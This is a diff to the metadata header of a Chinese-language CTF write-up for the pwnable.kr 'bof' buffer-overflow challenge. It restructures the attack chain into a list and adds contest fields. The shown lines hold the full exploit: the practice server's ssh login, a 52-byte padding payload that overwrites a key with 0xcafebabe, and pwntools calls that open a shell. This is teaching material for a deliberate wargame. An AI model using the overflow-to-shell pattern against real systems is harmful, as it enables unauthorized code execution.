@@ -14,7 +14,13 @@ tags:
 - aslr_disabled_pwnable
 - classic_pwn_lesson
 - 13x4_52_byte_padding
-attack_chain: 'ssh bof@pwnable.kr:2222 password guest → process ''./bof'' argv=[''bof''] → key=0xcafebabe → payload = b''A'' * 52 + p32(0xcafebabe) → overflow me : 触发覆盖 key → system("/bin/sh") 反弹'
+attack_chain:
+- 'ssh bof@pwnable.kr:2222 password guest'
+- 'process ''./bof'' argv=[''bof'']'
+- 'key=0xcafebabe'
+- 'payload = b''A'' * 52 + p32(0xcafebabe)'
+- 'overflow me : 触发覆盖 key'
+- 'system("/bin/sh") 反弹'
 key_payload: bof = b'A'*13*4 + p32(0xcafebabe) / ssh('bof', 'pwnable.kr', password='guest', port=2222) / p.sendline(bof) / p.interactive()
 one_liner: pwnable.kr 经典 bof 题：52 字节 (13 * 4) padding + p32(0xcafebabe) 覆盖 key → 触发 system("/bin/sh") 反弹 shell。
 lesson: pwnable.kr bof 是 CTF PWN 入门经典题，无 canary + 无 PIE + ASLR 禁用，payload 直接覆盖 key 触发后门；pwntools ssh 模块一键连远程。
@@ -54,6 +60,8 @@ prerequisites:
 - pwntools ssh/process/remote 模块使用
 - 32 位栈溢出 padding 计算
 - ret2win 入门思路
+contest_normalized: "pwnable.kr"
+contest_year: 2025
 ---
 # [pwnable.kr] bof 题解
 
